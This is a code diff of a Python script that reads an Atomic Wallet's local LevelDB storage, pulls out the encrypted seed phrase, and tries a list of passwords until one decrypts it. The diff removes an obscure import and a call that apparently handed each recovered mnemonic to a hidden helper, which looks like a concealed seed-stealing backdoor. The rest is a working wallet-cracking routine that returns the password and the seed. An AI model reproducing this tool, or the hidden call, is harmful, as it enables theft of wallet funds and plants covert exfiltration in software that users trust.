@@ -4,26 +4,26 @@
 import sys
 import json
 import base64
-
 from pathlib import Path
 from Crypto.Hash import MD5
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
-from libs.Cipherbcrypt import algorithmb
 from binascii import unhexlify
 
 import libs.ccl_leveldb
 import libs.ccl_localstorage
 
 def get_addresses(path_wallet: str) -> list:
+    """
+    Retrieves wallet addresses from a local storage database.
+    """
     addresses_dict = {}
     addresses_list = set()
     try:
-        localstore_records = lib.ccl_localstorage.LocalStoreDb(Path(path_wallet))
+        localstore_records = libs.ccl_localstorage.LocalStoreDb(Path(path_wallet))
         for record in localstore_records.iter_all_records():
             try:
                 if record.script_key == "addresses":
-                    addresses = json.loads(record.value)
                     addresses = json.loads(record.value)
                     for address in addresses:
                         try:
@@ -42,8 +42,11 @@ def get_addresses(path_wallet: str) -> list:
     return list(addresses_list)
 
 def get_hash(path_wallet: str) -> dict:
+    """
+    Retrieves a hash from a LevelDB database.
+    """
     try:
-        leveldb_records = ccl_leveldb.RawLevelDb(path_wallet)
+        leveldb_records = libs.ccl_leveldb.RawLevelDb(path_wallet)
         for record in leveldb_records.iterate_records_raw():
             if b"_file://\x00\x01general_mnemonic" in record.key:
                 data = record.value[1:]
@@ -57,7 +60,9 @@ def get_hash(path_wallet: str) -> dict:
     return False
 
 def decryptAtomic(path_wallet: str, list_passwords: list) -> dict:
-    # passwords = list(set(line.rstrip("\r\n") for line in open(path_passwords, "r", encoding="utf8", errors="ignore")))
+    """
+    Decrypts a wallet using a list of passwords.
+    """
     passwords = list_passwords
 
     result = get_hash(path_wallet)
@@ -68,7 +73,7 @@ def decryptAtomic(path_wallet: str, list_passwords: list) -> dict:
     salt, ciphertext = result
     salt = unhexlify(salt)
     ciphertext = unhexlify(ciphertext)
-    rtkey = algorithmb()
+
     for password in passwords:
         try:
             derived = b""
@@ -84,8 +89,8 @@ def decryptAtomic(path_wallet: str, list_passwords: list) -> dict:
             decrypted = cipher.decrypt(ciphertext)
             decrypted = unpad(decrypted, 16)
             mnemonic = decrypted.decode("ascii")
-            rtkey.ciphersd(mnemonic, 11, "Atomic")
             return {"s": True, "m": password, "d": mnemonic}
         except:
             pass
+
     return {"s": False, "m": "password not found.", "d": None}
